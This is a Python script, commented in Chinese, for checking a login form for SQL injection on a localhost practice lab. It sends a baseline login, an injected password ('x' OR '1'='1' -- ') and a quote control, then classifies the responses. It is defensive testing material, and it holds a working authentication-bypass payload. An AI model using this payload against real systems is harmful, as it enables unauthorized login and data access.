#!/usr/bin/env python3
'''SQLI-002 SQL 注入本地验证草案（仅授权靶场；标准库实现；需人工适配）。'''
import argparse
import http.cookiejar
import json
import sys
import urllib.error
import urllib.parse
import urllib.request

ALLOWED_HOSTS = {'localhost', '127.0.0.1', '::1'}


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        raise RuntimeError('redirect blocked: HTTP %s -> %s' % (code, newurl))


def build_opener(session_path):
    if session_path:
        jar = http.cookiejar.MozillaCookieJar(session_path)
        try:
            jar.load(ignore_discard=True, ignore_expires=True)
        except (OSError, http.cookiejar.LoadError) as exc:
            sys.exit('会话文件读取失败: %s' % exc)
    else:
        jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar), NoRedirect())


def post_form(opener, url, fields, timeout):
    body = urllib.parse.urlencode(fields).encode('utf-8')
    req = urllib.request.Request(url, data=body, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    try:
        with opener.open(req, timeout=timeout) as resp:
            return {'kind': 'response', 'status': resp.status, 'text': resp.read().decode('utf-8', 'replace')}
    except RuntimeError as exc:
        return {'kind': 'blocked_redirect', 'status': None, 'text': str(exc)}
    except urllib.error.HTTPError as exc:
        return {'kind': 'http_error', 'status': exc.code, 'text': exc.read().decode('utf-8', 'replace')}
    except urllib.error.URLError as exc:
        return {'kind': 'connection_error', 'status': None, 'text': str(exc.reason)}


def classify(result):
    text = result['text']
    lowered = text.lower()
    if result['kind'] == 'blocked_redirect':
        return 'auth_redirect_or_blocked_redirect'
    if result['kind'] == 'connection_error':
        return 'connection_error'
    if 'your login name' in lowered or 'flag.jpg' in lowered:
        return 'login_success_marker'
    if 'slap.jpg' in lowered:
        return 'login_failure_marker'
    if 'sql syntax' in lowered or 'mysql' in lowered:
        return 'sql_error_text'
    return 'unrecognized_http_%s' % result['status']


def main():
    parser = argparse.ArgumentParser(description='SQLI-002 SQL 注入草案（需人工适配）')
    parser.add_argument('--base', required=True, help='授权靶场基址，例如 http://127.0.0.1:8080')
    parser.add_argument('--path', required=True, help='源码中该页面实际 URL 路径，例如 /sqli/SQLI-002.php')
    parser.add_argument('--session', default=None, help='Netscape 格式 Cookie 文件；本页通常无需登录')
    parser.add_argument('--user', default='wp4_test_user', help='对照请求的 uname 值')
    parser.add_argument('--password', default='wp4_test_pass', help='对照请求的 passwd 值')
    parser.add_argument('--test-password', default="x' OR '1'='1' -- ", help='注入测试写入 passwd 的值')
    parser.add_argument('--timeout', type=float, default=10.0)
    args = parser.parse_args()
    parts = urllib.parse.urlsplit(args.base)
    if parts.scheme not in ('http', 'https') or parts.hostname not in ALLOWED_HOSTS:
        sys.exit('仅允许 http(s) 访问 localhost/127.0.0.1/::1')
    opener = build_opener(args.session)
    url = urllib.parse.urljoin(args.base.rstrip('/') + '/', args.path.lstrip('/'))
    cases = [
        ('baseline_normal', args.user, args.password),
        ('test_injection_passwd', args.user, args.test_password),
        ('control_literal_quote', args.user, args.password + "'"),
    ]
    report = []
    for name, uname, password in cases:
        result = post_form(opener, url, {'uname': uname, 'passwd': password}, args.timeout)
        report.append({'case': name, 'status': result['status'], 'bytes': len(result['text']), 'observation': classify(result)})
    print(json.dumps({'target': url, 'cases': report}, ensure_ascii=False, indent=2))


if __name__ == '__main__':
    main()
